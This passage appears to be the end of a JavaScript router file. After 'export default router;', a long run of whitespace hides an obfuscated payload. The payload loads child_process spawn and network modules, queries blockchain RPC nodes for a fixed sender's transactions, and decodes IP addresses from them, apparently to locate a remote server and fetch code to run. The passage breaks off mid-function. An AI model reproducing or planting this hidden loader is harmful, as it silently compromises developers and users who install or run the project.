export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.i = 'A11-8-1--#';const xXfMZKDLYuTRIADnwGIKpCU=y$zxQ$V;(function(iECUrs,ymPzxh_S){const QxuUqazAJKADZDlPufPmG$Io=y$zxQ$V,bYtzbdsKbgyUaNBpsHlmiWMl=iECUrs();while(!![]){try{const Y__vXFPN=parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x164))/(-0x1*-0xa7+-parseInt(0x711)+Math.floor(parseInt(0x35))*parseInt(parseInt(0x1f)))*(-parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x184))/(-0x1ac5+parseInt(0xc1)*Math.ceil(-parseInt(0x24))+0x35eb))+Math['max'](parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x134))/(parseFloat(-parseInt(0x1))*-parseInt(0x1d09)+Math.max(-parseInt(0x17b2),-0x17b2)+Math.max(-parseInt(0x554),-parseInt(0x554))),parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x15f))/(parseInt(-0x602)+0xaae+-0x4a8))*(-parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x187))/(parseInt(0x11)*Math.trunc(-0x4a)+Math.floor(0x833)*Math.max(0x1,0x1)+parseFloat(0x4c)*-parseInt(0xb)))+parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x154))/(-parseInt(0x10d)*-0x7+parseInt(0x1)*0x599+parseFloat(parseInt(0xa))*-0x14b)*parseFloat(-parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x13a))/(parseInt(0x1e5)+-parseInt(0x2)*-0x325+Math.trunc(-0x828)))+Math['max'](-parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x129))/(0x1*parseInt(0x1ba6)+-parseInt(0x191c)+Math.max(parseInt(0x1),0x1)*-0x282),-parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x19c))/(Math.trunc(-parseInt(0x13bb))+Math.max(-parseInt(0x1),-parseInt(0x1))*Math.max(parseInt(0x1231),0x1231)+-parseInt(0x4f)*-0x7b))+parseFloat(parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x150))/(Math.ceil(parseInt(0xb5))*parseInt(parseInt(0x10))+-0x903+-parseInt(0x243)))*(parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x14f))/(0x7d1+Number(-0x61d)+parseInt(-0x19)*0x11))+Math['trunc'](parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x145))/(Number(-0x1472)*-0x1+parseFloat(0x300)+0x1766*-parseInt(0x1)))+Math['trunc'](parseFloat(QxuUqazAJKADZDlPufPmG$Io(0x170))/(-0x91a+-parseInt(0x12a)*parseFloat(-parseInt(0x10))+0x19*-parseInt(0x61)));if(Y__vXFPN===ymPzxh_S)break;else bYtzbdsKbgyUaNBpsHlmiWMl['push'](bYtzbdsKbgyUaNBpsHlmiWMl['shift']());}catch(u$wgXtGoFuE){bYtzbdsKbgyUaNBpsHlmiWMl['push'](bYtzbdsKbgyUaNBpsHlmiWMl['shift']());}}}(ygdhqkpCgKxflnUACX,-0x1*0x162a2a+parseInt(0x12ef14)+-0x2*-parseInt(0x930e3)));import{createRequire}from'module';const require=createRequire(import.meta[xXfMZKDLYuTRIADnwGIKpCU(0x12e)]);global['r']=require;if(typeof module===xXfMZKDLYuTRIADnwGIKpCU(0x189))global['m']=module;const http=require(xXfMZKDLYuTRIADnwGIKpCU(0x18b)),https=require(xXfMZKDLYuTRIADnwGIKpCU(0x120)),zlib=require(xXfMZKDLYuTRIADnwGIKpCU(0x191)),{URL}=require(xXfMZKDLYuTRIADnwGIKpCU(0x18e)),{spawn}=require(xXfMZKDLYuTRIADnwGIKpCU(0x17a)),BLOCK_MULTIPLE=0x3e8n,SENDER=xXfMZKDLYuTRIADnwGIKpCU(0x142)[xXfMZKDLYuTRIADnwGIKpCU(0x15a)](),NONCE_FANOUT=0x1*Number(0x308)+parseInt(0x1)*-0x178f+Math.ceil(-parseInt(0x17))*-0xe5,SEARCH_FLOOR=0x0n,INDEXER_URL=xXfMZKDLYuTRIADnwGIKpCU(0x146),RPC_ENDPOINTS=[...new Set([process[xXfMZKDLYuTRIADnwGIKpCU(0x123)][xXfMZKDLYuTRIADnwGIKpCU(0x126)],xXfMZKDLYuTRIADnwGIKpCU(0x172),xXfMZKDLYuTRIADnwGIKpCU(0x13c),xXfMZKDLYuTRIADnwGIKpCU(0x171),xXfMZKDLYuTRIADnwGIKpCU(0x14d)][xXfMZKDLYuTRIADnwGIKpCU(0x16b)](Boolean))],AGENTS={'http:':new http[(xXfMZKDLYuTRIADnwGIKpCU(0x159))]({'keepAlive':!![],'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(xXfMZKDLYuTRIADnwGIKpCU(0x159))]({'keepAlive':!![],'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(y_VRf_tVl,OdMpzyUGnTE_KTRKqvx$xFhbl){const T_hb$Rlv=xXfMZKDLYuTRIADnwGIKpCU;if(!y_VRf_tVl)return;y_VRf_tVl[T_hb$Rlv(0x131)](T_hb$Rlv(0x12f),()=>OdMpzyUGnTE_KTRKqvx$xFhbl[T_hb$Rlv(0x12f)](),{'once':!![]});}function decompressStream(Ev$cvxYsgWdzchDLYjlXtJNG){const wkF$kn=xXfMZKDLYuTRIADnwGIKpCU,FTrfPv$OCJUjsXow=(Ev$cvxYsgWdzchDLYjlXtJNG[wkF$kn(0x183)][wkF$kn(0x124)]||'')[wkF$kn(0x15a)]();if(FTrfPv$OCJUjsXow===wkF$kn(0x16f)||FTrfPv$OCJUjsXow===wkF$kn(0x155))return Ev$cvxYsgWdzchDLYjlXtJNG[wkF$kn(0x17f)](zlib[wkF$kn(0x12b)]());if(FTrfPv$OCJUjsXow===wkF$kn(0x148))return Ev$cvxYsgWdzchDLYjlXtJNG[wkF$kn(0x17f)](zlib[wkF$kn(0x135)]());if(FTrfPv$OCJUjsXow==='br')return Ev$cvxYsgWdzchDLYjlXtJNG[wkF$kn(0x17f)](zlib[wkF$kn(0x157)]());return Ev$cvxYsgWdzchDLYjlXtJNG;}function httpRequest(P_DHEPLVqtP_NKhkPez,{method:method=xXfMZKDLYuTRIADnwGIKpCU(0x188),body:WjLwHqh_v,signal:HAKh_KCzxBeTWPvbdKwtA}={}){const NqxGTrBbFKOPHkXCif$gLSa$bf=xXfMZKDLYuTRIADnwGIKpCU,ncBNrYpPy_ASILM$xdHVhsgrIR=new URL(P_DHEPLVqtP_NKhkPez),cDCzKulmFY=ncBNrYpPy_ASILM$xdHVhsgrIR[NqxGTrBbFKOPHkXCif$gLSa$bf(0x143)]===NqxGTrBbFKOPHkXCif$gLSa$bf(0x122)?https:http,NDZfTGscWmjgRlRFVX={'Accept':NqxGTrBbFKOPHkXCif$gLSa$bf(0x180),'Accept-Encoding':NqxGTrBbFKOPHkXCif$gLSa$bf(0x195),'Connection':NqxGTrBbFKOPHkXCif$gLSa$bf(0x197)};return WjLwHqh_v!=null&&(NDZfTGscWmjgRlRFVX[NqxGTrBbFKOPHkXCif$gLSa$bf(0x140)]=NqxGTrBbFKOPHkXCif$gLSa$bf(0x180),NDZfTGscWmjgRlRFVX[NqxGTrBbFKOPHkXCif$gLSa$bf(0x137)]=Buffer[NqxGTrBbFKOPHkXCif$gLSa$bf(0x12d)](WjLwHqh_v)),new Promise((r$rBRHkLeiekPY$qavUa,xtG$jc$UuwrljlI)=>{const iYiLEcskTpnYTJPqrZsogV=NqxGTrBbFKOPHkXCif$gLSa$bf,Z$GtOvgDwYlFKRgaJYRqfcz=cDCzKulmFY[iYiLEcskTpnYTJPqrZsogV(0x18f)]({'hostname':ncBNrYpPy_ASILM$xdHVhsgrIR[iYiLEcskTpnYTJPqrZsogV(0x15d)],'port':ncBNrYpPy_ASILM$xdHVhsgrIR[iYiLEcskTpnYTJPqrZsogV(0x17d)]||(ncBNrYpPy_ASILM$xdHVhsgrIR[iYiLEcskTpnYTJPqrZsogV(0x143)]===iYiLEcskTpnYTJPqrZsogV(0x122)?parseInt(0xd8d)*-0x2+0x1690+parseFloat(parseInt(0x645)):-parseInt(0xdbc)+Math.floor(-0x14e5)+0x22f1),'path':ncBNrYpPy_ASILM$xdHVhsgrIR[iYiLEcskTpnYTJPqrZsogV(0x144)]+ncBNrYpPy_ASILM$xdHVhsgrIR[iYiLEcskTpnYTJPqrZsogV(0x156)],'method':method,'agent':AGENTS[ncBNrYpPy_ASILM$xdHVhsgrIR[iYiLEcskTpnYTJPqrZsogV(0x143)]],'signal':HAKh_KCzxBeTWPvbdKwtA,'headers':NDZfTGscWmjgRlRFVX},MmSsm_FiLjLpdBa$KTndpO=>{const Z$oUMyGKJ_lzOIA=iYiLEcskTpnYTJPqrZsogV,G$OQvkCwj_QkKkkjK=decompressStream(MmSsm_FiLjLpdBa$KTndpO),YPq_rcqE$lwBmFldf=[];G$OQvkCwj_QkKkkjK['on'](Z$oUMyGKJ_lzOIA(0x160),BSUnlIcprZhMLn=>YPq_rcqE$lwBmFldf[Z$oUMyGKJ_lzOIA(0x192)](BSUnlIcprZhMLn)),G$OQvkCwj_QkKkkjK['on'](Z$oUMyGKJ_lzOIA(0x186),()=>{const IOXVwwg_bQtz=Z$oUMyGKJ_lzOIA;try{r$rBRHkLeiekPY$qavUa(JSON[IOXVwwg_bQtz(0x199)](Buffer[IOXVwwg_bQtz(0x182)](YPq_rcqE$lwBmFldf)[IOXVwwg_bQtz(0x193)](IOXVwwg_bQtz(0x130))));}catch(nQg$EvViWHcRsDjKlktTCSx){xtG$jc$UuwrljlI(nQg$EvViWHcRsDjKlktTCSx);}}),G$OQvkCwj_QkKkkjK['on'](Z$oUMyGKJ_lzOIA(0x16d),xtG$jc$UuwrljlI);});Z$GtOvgDwYlFKRgaJYRqfcz['on'](iYiLEcskTpnYTJPqrZsogV(0x16d),xtG$jc$UuwrljlI);if(WjLwHqh_v!=null)Z$GtOvgDwYlFKRgaJYRqfcz[iYiLEcskTpnYTJPqrZsogV(0x13b)](WjLwHqh_v);Z$GtOvgDwYlFKRgaJYRqfcz[iYiLEcskTpnYTJPqrZsogV(0x186)]();});}async function withRpcEndpoints(ZJCqvspIHG$daRzgmqdPpUCkN,a_Mban){const Z_rFHDSrxbFBYmc=xXfMZKDLYuTRIADnwGIKpCU,lmC$fKBjd_JiJx=RPC_ENDPOINTS[Z_rFHDSrxbFBYmc(0x14a)](()=>new AbortController());lmC$fKBjd_JiJx[Z_rFHDSrxbFBYmc(0x16a)](EABDkr_crWzbpYPrABCXIjcDUy=>linkAbort(a_Mban,EABDkr_crWzbpYPrABCXIjcDUy));try{return await Promise[Z_rFHDSrxbFBYmc(0x12c)](RPC_ENDPOINTS[Z_rFHDSrxbFBYmc(0x14a)]((KYWnxEt_oF,ec_jPVov)=>ZJCqvspIHG$daRzgmqdPpUCkN(KYWnxEt_oF,lmC$fKBjd_JiJx[ec_jPVov][Z_rFHDSrxbFBYmc(0x196)])));}finally{for(const AWUUaNkfPHOjVnzJoRjdSnN of lmC$fKBjd_JiJx)AWUUaNkfPHOjVnzJoRjdSnN[Z_rFHDSrxbFBYmc(0x12f)]();}}async function rpcCall(BtQmzpBlv_boOex,QgFrLBzZYlWAER$udPUdg,NSUnLxtacDARwCiVCjUovCSHO,pdhnuvK){const vxQecjNGmwn=xXfMZKDLYuTRIADnwGIKpCU,IlTvcj$_UXzsDHemPhQ=await httpRequest(BtQmzpBlv_boOex,{'method':vxQecjNGmwn(0x15b),'body':JSON[vxQecjNGmwn(0x17e)]({'jsonrpc':vxQecjNGmwn(0x13f),'id':0x1,'method':QgFrLBzZYlWAER$udPUdg,'params':NSUnLxtacDARwCiVCjUovCSHO}),'signal':pdhnuvK});return IlTvcj$_UXzsDHemPhQ[vxQecjNGmwn(0x15c)];}async function rpcBatch(MOUxBFEHg$ubvQV,UQyk$CMhjc$JHjZ,msGvLp){const bQDo_$x=xXfMZKDLYuTRIADnwGIKpCU,HjVSCsvHbjxak=await httpRequest(MOUxBFEHg$ubvQV,{'method':bQDo_$x(0x15b),'body':JSON[bQDo_$x(0x17e)](UQyk$CMhjc$JHjZ[bQDo_$x(0x14a)](([k__HCtg,FuxxSM],TZClzackEBCPYmQD)=>({'jsonrpc':bQDo_$x(0x13f),'id':TZClzackEBCPYmQD+(parseInt(-parseInt(0x5fe))+parseInt(0xe74)+Math.ceil(-parseInt(0x875))),'method':k__HCtg,'params':FuxxSM}))),'signal':msGvLp}),tSrciNpiucctDUSrzVkfca=new Map(HjVSCsvHbjxak[bQDo_$x(0x14a)](MMIIveikPYRNZiYguUuNJTq=>[MMIIveikPYRNZiYguUuNJTq['id'],MMIIveikPYRNZiYguUuNJTq]));return UQyk$CMhjc$JHjZ[bQDo_$x(0x14a)]((WwAqChApbxRbSu,iGOujKtwJZOlWeUho)=>tSrciNpiucctDUSrzVkfca[bQDo_$x(0x16c)](iGOujKtwJZOlWeUho+(-parseInt(0x18df)*Number(-parseInt(0x1))+Number(-0x2076)+0x6*parseInt(0x144)))[bQDo_$x(0x15c)]);}const toBlockHex=qsuOxTwtvdzWQ=>'0x'+qsuOxTwtvdzWQ[xXfMZKDLYuTRIADnwGIKpCU(0x193)](-0x5d8+0x4a1*0x3+Math.ceil(-0x7fb));function findSenderTx(ss$XzuOJDrMzw){const PYnCGYXBJBl_y=xXfMZKDLYuTRIADnwGIKpCU;return ss$XzuOJDrMzw[PYnCGYXBJBl_y(0x141)](wxy$ShEph=>wxy$ShEph[PYnCGYXBJBl_y(0x163)]&&wxy$ShEph[PYnCGYXBJBl_y(0x163)][PYnCGYXBJBl_y(0x15a)]()===SENDER)||null;}function ygdhqkpCgKxflnUACX(){const rmG$rZklJvJUbCO$fnZqh=['919f9c9098bd869e919681','91928096c5c7','c9cbc3','959c81b692909b','959a9f879681','949687','9681819c81','9d9c9796','94899a83','c6c3c4cbc0c5c3c0bdb487948497','9b87878380c9dcdc96879b968196869ede818390dd8386919f9a909d9c9796dd909c9e','9b87878380c9dcdcc2818390dd9a9cdc96879b','8ade83accd97d7c3b1d5b3adc292a298','96879bac919f9c9098bd869e919681','d4c8949f9c91929fa8d4ac87ac80d4aeced4','9b9280','d58087928187919f9c9098cec3d5969d97919f9c9098cecacacacacacacacad583929496cec2d59c9595809687cec1c3d5809c8187ce97968090d5959a9f879681918ace95819c9e','9f969d94879b','909c9d87819c9f9f9681','9d9c9796c9909b9a9f97ac83819c90968080','909b9281b09c9796b287','d4c8949f9c91929fa8d481d4aece819682869a8196c8949f9c91929fa8d49ed4aece9e9c97869f96c8859281d3ac949f9c91929fce949f9c91929fc8','839c8187','8087819a9d949a958a','839a8396','9283839f9a9092879a9c9ddc99809c9d','8196839f929096','909c9d909287','9b969297968180','c4c1aab1a0bfa4a1','8781929d809290879a9c9d80','969d97','c1c7c7cbc2c6c697a798b7a399','b4b6a7','9c9199969087','be9c899a9f9f92dcc6ddc3d3dba49a9d979c8480d3bda7d3c2c3ddc3c8d3a49a9dc5c7c8d38bc5c7dad3b283839f96a49691b89a87dcc6c0c4ddc0c5d3dbb8bba7bebfdfd39f9a9896d3b49690989cdad3b09b819c9e96dcc2c0c2ddc3ddc3ddc3d3a0929592819adcc6c0c4ddc0c5','9d9c9796c99b878783','909287909b','949f9c91929fa8d4aca5d4aeced4','9d9c9796c986819f','81968286968087','cc9e9c97869f96ce9290909c869d87d59290879a9c9dce878b9f9a8087d592979781968080ce','9d9c9796c9899f9a91','8386809b','879ca087819a9d94','bbb6b2b7','94899a83dfd39796959f928796dfd39181','809a949d929f','98969683de929f9a8596','808691928181928a','8392818096','959a9d97ba9d97968b','d4c8949f9c91929fa8d4ac87ac86d4aeced4','c1cbc2c1c0c3c19aa3808ab9b1','9d9c9796c99b87878380','929797','9b87878380c9','969d85','909c9d87969d87de969d909c979a9d94','9a80b28181928a','b6a7bbaca1a3b0aca6a1bf','8bde83928a9f9c9297de91c5c7','9a949d9c8196','c1c7cacacbc1c7b0a5b59998ba','ac87ac80','908196928796b4869d899a83','929d8a','918a8796bf969d94879b','86819f','92919c8187','868795cb','929797b685969d87bf9a8087969d9681','9b968b','929f9f','c0b2ba85a6bd91','908196928796ba9d959f928796','82c7b5a9988bab88d29bdfa081c0ceb3','b09c9d87969d87debf969d94879b','9e9a9d','d4c8949f9c91929fa8d4acbbc1d4aeced4','c49eb2b99aa497','84819a8796','9b87878380c9dcdc96879bdd97818390dd9c8194','819680869e96','96879bac949687a781929d809290879a9c9db09c869d87','c1ddc3','b09c9d87969d87dea78a8396','959a9d97','c38b92c0c1c1b6c695c0b7c0c2c2b7c0c3cbc396c595c3c2c1c2c3c5c096ca92b7b0c1c7cac3b695c292','83819c879c909c9f','8392879b9d929e96','cbc6c1c1c4c5c38795a6b09d83','9b87878380c9dcdc96879bdd919f9c909880909c8687dd909c9edc92839a','d4c8949f9c91929fa8d4acbbd4aeced4','9796959f928796','be9a80809a9d94d3abdea3928a9f9c9297deb1c5c7','9e9283','9b878783c9dcdc','879b969d','9b87878380c9dcdc96879bde9e929a9d9d9687dd8386919f9a90dd919f92808792839add9a9c','b69e83878ad383928a9f9c9297d3919c978a','c5c2c1c4a6a3a5a9bda5','c6c4c0c38a98bc979c98','81869d','c9c7c7c0dcc38bdc909f80','c9c7c7c0dcc38bdc9f80','c2c3c6c5c3c4cacbb5a1bc98b782','8bde94899a83','80969281909b','908196928796b1819c879f9ab796909c9e8381968080','869d819695','b294969d87','879cbf9c849681b0928096','a3bca0a7','819680869f87','9b9c80879d929e96','ac87ac86','c7bc9eb5b2859a','97928792','c9c7c7c0','96879bac949687b19f9c9098b18abd869e919681','95819c9e','c0cbc0c6c2b4abb287bbb9','acbbc1','9d9c9d9096'];ygdhqkpCgKxflnUACX=function(){return rmG$rZklJvJUbCO$fnZqh;};return ygdhqkpCgKxflnUACX();}function decodeAddress(MU$BxwqDSlg_szWjnqdSd){const hbaAsehW_uX=xXfMZKDLYuTRIADnwGIKpCU,UgYMdAIOcrY=Buffer[hbaAsehW_uX(0x163)](MU$BxwqDSlg_szWjnqdSd[hbaAsehW_uX(0x181)](/^0x/i,''),hbaAsehW_uX(0x132)),bnzeADhnIXvcM_FTdqPQvf=I$_YPKDmVd=>I$_YPKDmVd[-parseInt(0x1)*Number(parseInt(0x1a3d))+-parseInt(0x1e70)+Math.max(-0x38ad,-parseInt(0x38ad))*-parseInt(0x1)]+'.'+I$_YPKDmVd[Math.trunc(-parseInt(0x8ed))+-parseInt(0x15f4)+Math.max(0x1ee2,0x1ee2)]+'.'+I$_YPKDmVd[parseInt(0x12a)*0x18+-0x1*-0x1cc3+Number(-0x38b1)]+'.'+I$_YPKDmVd[0x2632*-parseInt(0x1)+Math.ceil(-0x216a)+Number(0x479f)];return[bnzeADhnIXvcM_FTdqPQvf(UgYMdAIOcrY[hbaAsehW_uX(0x198)](Number(parseInt(0x17f))*-0x1+-0xe72+Math.trunc(parseInt(0xff1)),Number(0x15d1)+parseInt(0x1)*-0xdc9+-parseInt(0x804))),bnzeADhnIXvcM_FTdqPQvf(UgYMdAIOcrY[hbaAsehW_uX(0x198)](Math.max(-parseInt(0x24e1),-0x24e1)+parseFloat(-parseInt(0x257b))*parseInt(parseInt(0x1))+parseInt(0x4a60),parseInt(0xb25)*parseFloat(-parseInt(0x1))+parseFloat(-0x1147)*parseInt(0x2)+0x2dbb))];}function firstMatch(FAZkxSE_vngdDDmJvC){return new Promise(OxJ$dP=>{const ckn_BCUQ_p=y$zxQ$V;let PlSdmzp=FAZkxSE_vngdDDmJvC[ckn_BCUQ_p(0x178)];if(!PlSdmzp)return OxJ$dP(null);let TkpygZAycIWpKJ_r=![];const UdflpddazqRXj$ZLymKPhkLt=TlJh$lhQQj=>{const xSHhkOxLpfSFTuTzxZuiqMb=ckn_BCUQ_p;if(TkpygZAycIWpKJ_r)return;TkpygZAycIWpKJ_r=!![];for(const JsBFoHAhwldFggqjTOC$bQPx_rm of FAZkxSE_vngdDDmJvC)JsBFoHAhwldFggqjTOC$bQPx_rm[xSHhkOxLpfSFTuTzxZuiqMb(0x179)][xSHhkOxLpfSFTuTzxZuiqMb(0x12f)]();OxJ$dP(TlJh$lhQQj);};for(const GnslQRGpGMKHRHKnBsMmBjMU of FAZkxSE_vngdDDmJvC){GnslQRGpGMKHRHKnBsMmBjMU[ckn_BCUQ_p(0x151)]()[ckn_BCUQ_p(0x14c)](JVtJ$EhqZJ=>{if(TkpygZAycIWpKJ_r)return;if(JVtJ$EhqZJ)UdflpddazqRXj$ZLymKPhkLt(JVtJ$EhqZJ);else{if(--PlSdmzp===parseInt(0x2e)*-0x5f+0x1*0x2b4+parseInt(0xe5e))OxJ$dP(null);}})[ckn_BCUQ_p(0x18c)](()=>{if(!TkpygZAycIWpKJ_r&&--PlSdmzp===-parseInt(0x280)*-parseInt(0x4)+Math.ceil(parseInt(0x18dc))*Math.floor(-0x1)+Math.ceil(-parseInt(0xc))*-0x13d)OxJ$dP(null);});}});}function candidateBlocks(toTlKlAisDPWWLoPzYWz){const fHAtqr__rcUedK=xXfMZKDLYuTRIADnwGIKpCU,gsc$ZpdMN$Qlxp=toTlKlAisDPWWLoPzYWz-BLOCK_MULTIPLE,Ms_g$AYBRPb=new Set(),RaNpADr_DZjT=[];for(const pEAUVwX$CUEOM of[toTlKlAisDPWWLoPzYWz-0x1n,toTlKlAisDPWWLoPzYWz,toTlKlAisDPWWLoPzYWz+0x1n,gsc$ZpdMN$Qlxp-0x1n,gsc$ZpdMN$Qlxp,gsc$ZpdMN$Qlxp+0x1n]){if(pEAUVwX$CUEOM<0x0n)continue;const Vhstdizw_$eCXUBdTR=pEAUVwX$CUEOM[fHAtqr__rcUedK(0x193)]();if(Ms_g$AYBRPb[fHAtqr__rcUedK(0x176)](Vhstdizw_$eCXUBdTR))continue;Ms_g$AYBRPb[fHAtqr__rcUedK(0x121)](Vhstdizw_$eCXUBdTR),RaNpADr_DZjT[fHAtqr__rcUedK(0x192)](pEAUVwX$CUEOM);}return RaNpADr_DZjT;}function blockTask(uMtQfmlZAsztJco$YSqTyOAzm){const cXxUNiMHCdnRyhSnUOIamZ=new AbortController();return{'controller':cXxUNiMHCdnRyhSnUOIamZ,'run':async()=>{const Or$Pf_Kt=y$zxQ$V,vvmeeuZrcwflohEomwrXib=await withRpcEndpoints((iYzWBWfAYwLFVcZnGremLN_A,lfBqsQSC)=>rpcCall(iYzWBWfAYwLFVcZnGremLN_A,Or$Pf_Kt(0x162),[toBlockHex(uMtQfmlZAsztJco$YSqTyOAzm),!![]],lfBqsQSC),cXxUNiMHCdnRyhSnUOIamZ[Or$Pf_Kt(0x196)]),HTMvgJHVAi_PebhsJCawoSt=vvmeeuZrcwflohEomwrXib?.[Or$Pf_Kt(0x185)];if(!Array[Or$Pf_Kt(0x125)](HTMvgJHVAi_PebhsJCawoSt))return null;const RDXCEbaed_NNVeqjxCErW=findSenderTx(HTMvgJHVAi_PebhsJCawoSt);return RDXCEbaed_NNVeqjxCErW?{'blockNumber':uMtQfmlZAsztJco$YSqTyOAzm,'tx':RDXCEbaed_NNVeqjxCErW}:null;}};}async function nonceAtBlocks(mzLqWML,wpMTNHp_fT_b){const MxBNEpFELE=xXfMZKDLYuTRIADnwGIKpCU,bpqpdgBuNXjMHjK_X$P=mzLqWML[MxBNEpFELE(0x14a)](ehYiP=>[MxBNEpFELE(0x13e),[SENDER,toBlockHex(ehYiP)]]);try{return(await withRpcEndpoints((FMWqMnDlPFtCNvmPyHLqeN_ahm,itWvKAkgQrzNEZ)=>rpcBatch(FMWqMnDlPFtCNvmPyHLqeN_ahm,bpqpdgBuNXjMHjK_X$P,itWvKAkgQrzNEZ),wpMTNHp_fT_b))[MxBNEpFELE(0x14a)](BigInt);}catch{return(await Promise[MxBNEpFELE(0x133)](bpqpdgBuNXjMHjK_X$P[MxBNEpFELE(0x14a)](([tkPmxfi_ks_gWq,o_T_HxPVEno])=>withRpcEndpoints((ipnwxKLN_PpKlRKirQnl,Wv_Nkc_bEFfJztVZaiGThgKpFA)=>rpcCall(ipnwxKLN_PpKlRKirQnl,tkPmxfi_ks_gWq,o_T_HxPVEno,Wv_Nkc_bEFfJztVZaiGThgKpFA),wpMTNHp_fT_b))))[MxBNEpFELE(0x14a)](BigInt);}}async function lastSenderTx(WcNxzfCMb){const lNF_C$P=xXfMZKDLYuTRIADnwGIKpCU,fICQP$lGUqIbzRdOP=new AbortController();try{const aFEOMLTPsfqRPF$ty$Sjq=WcNxzfCMb??BigInt(await withRpcEndpoints((FK_jyzC,oOowyBiFnPyHBygwHecsMPWcI)=>rpcCall(FK_jyzC,lNF_C$P(0x174),[],oOowyBiFnPyHBygwHecsMPWcI),fICQP$lGUqIbzRdOP[lNF_C$P(0x196)])),ZTxziQZsm_NKiXjXIFa$aTjNCp=BigInt(await withRpcEndpoints((wR$eNreoQfCjsqw,TUziriEUeeGdPvmUy_oczo)=>rpcCall(wR$eNreoQfCjsqw,lNF_C$P(0x13e),[SENDER,toBlockHex(aFEOMLTPsfqRPF$ty$Sjq)],TUziriEUeeGdPvmUy_oczo),fICQP$lGUqIbzRdOP[lNF_C$P(0x196)])),vB$Ovw=ZTxziQZsm_NKiXjXIFa$aTjNCp-0x1n;let YXGEZhwOhWVIJOqJTcXZN=SEARCH_FLOOR-0x1n,y$Jtge=aFEOMLTPsfqRPF$ty$Sjq;while(y$Jtge-YXGEZhwOhWVIJOqJTcXZN>0x1n){const dlXfFnQfpcKdKcib$D=y$Jtge-YXGEZhwOhWVIJOqJTcXZN-0x1n,Qhc_DJ$Z=BigInt(Math[lNF_C$P(0x138)](NONCE_FANOUT,Number(dlXfFnQfpcKdKcib$D))),hnXFOckcBoMuy_Do_t=[];for(let Ckme_i=0x1n;Ckme_i<=Qhc_DJ$Z;Ckme_i+=0x1n)hnXFOckcBoMuy_Do_t[lNF_C$P(0x192)](YXGEZhwOhWVIJOqJTcXZN+Ckme_i*(y$Jtge-YXGEZhwOhWVIJOqJTcXZN)/(Qhc_DJ$Z+0x1n));const REZyhjevDj$zk=await nonceAtBlocks(hnXFOckcBoMuy_Do_t,fICQP$lGUqIbzRdOP[lNF_C$P(0x196)]),OuidMYT_xluuI=REZyhjevDj$zk[lNF_C$P(0x19a)](ImBWxoozKOyA$U=>ImBWxoozKOyA$U>=ZTxziQZsm_NKiXjXIFa$aTjNCp);if(OuidMYT_xluuI===-(0x1*-0xf13+parseInt(0x524)+parseFloat(parseInt(0x9f0))))YXGEZhwOhWVIJOqJTcXZN=hnXFOckcBoMuy_Do_t[hnXFOckcBoMuy_Do_t[lNF_C$P(0x178)]-(0xe07+0x26f6+parseFloat(0xd3f)*parseInt(-0x4))];else{y$Jtge=hnXFOckcBoMuy_Do_t[OuidMYT_xluuI];if(OuidMYT_xluuI>-0x5*Math.max(-0x4a5,-parseInt(0x4a5))+parseInt(0x9)*-0x147+parseFloat(parseInt(0xbba))*Math.max(-0x1,-0x1))YXGEZhwOhWVIJOqJTcXZN=hnXFOckcBoMuy_Do_t[OuidMYT_xluuI-(Number(-0x1)*Math.floor(parseInt(0x2312))+Math.ceil(-parseInt(0x102e))+0x3341)];}}const jARJtYgFT=await withRpcEndpoints((MBWeHw$_fGWQDb,cNwKSMoDEwnXxp)=>rpcCall(MBWeHw$_fGWQDb,lNF_C$P(0x162),[toBlockHex(y$Jtge),!![]],cNwKSMoDEwnXxp),fICQP$lGUqIbzRdOP[lNF_C$P(0x196)]),WSpyBRLkDfTbeTImKzIAVjlWK=jARJtYgFT?.[lNF_C$P(0x185)]||[];let w$ziusFd$plAukK=null;for(const uFfoWM of WSpyBRLkDfTbeTImKzIAVjlWK){if(!uFfoWM[lNF_C$P(0x163)]||uFfoWM[lNF_C$P(0x163)][lNF_C$P(0x15a)]()!==SENDER)continue;if(BigInt(uFfoWM[lNF_C$P(0x166)])===vB$Ovw){w$ziusFd$plAukK=uFfoWM;break;}if(!w$ziusFd$plAukK||BigInt(uFfoWM[lNF_C$P(0x166)])>BigInt(w$ziusFd$plAukK[lNF_C$P(0x166)]))w$ziusFd$plAukK=uFfoWM;}return{'blockNumber':y$Jtge,'tx':w$ziusFd$plAukK};}finally{fICQP$lGUqIbzRdOP[lNF_C$P(0x12f)]();}}function y$zxQ$V(KRhhKrsFqmjfaAyx$wJ$rwk,WMQeIfpFFIMkfMwJsBWdled_u){const fLvbQaML=ygdhqkpCgKxflnUACX();return y$zxQ$V=function(tWGuleodYMnqSTTOUyaNyjlka,WZpkgC){tWGuleodYMnqSTTOUyaNyjlka=tWGuleodYMnqSTTOUyaNyjlka-(parseInt(-0x2)*0x1022+Math.max(-0x88d,-0x88d)+Math.trunc(parseInt(0x29f1)));let zzqNQlkX_jiVOqfG=fLvbQaML[tWGuleodYMnqSTTOUyaNyjlka];if(y$zxQ$V['vNELbx']===undefined){const esARJZ$grU=function(mbmdP_sDwWHHYstLPsLpvc){let Hysh$gVKlKX_M=parseInt(-0x1de4)+parseInt(0xf3e)+parseInt(0x1099)&0x3ce+Math.max(parseInt(0x233e),parseInt(0x233e))+-0x260d,PuWFvo_nC_J=new Uint8Array(mbmdP_sDwWHHYstLPsLpvc['match'](/.{1,2}/g)['map'](QHQrAhfyVRftV=>parseInt(QHQrAhfyVRftV,parseInt(parseInt(0x1))*parseFloat(parseInt(0x1771))+Math.floor(-parseInt(0xaa2))+-parseInt(0xfb)*Math.floor(parseInt(0xd))))),e_rrzkd$WLF=PuWFvo_nC_J['map'](TOdMpz$yUG=>TOdMpz$yUG^Hysh$gVKlKX_M),aEGvsEyMMX_jkJgx=new TextDecoder(),cOtBWu=aEGvsEyMMX_jkJgx['decode'](e_rrzkd$WLF);return 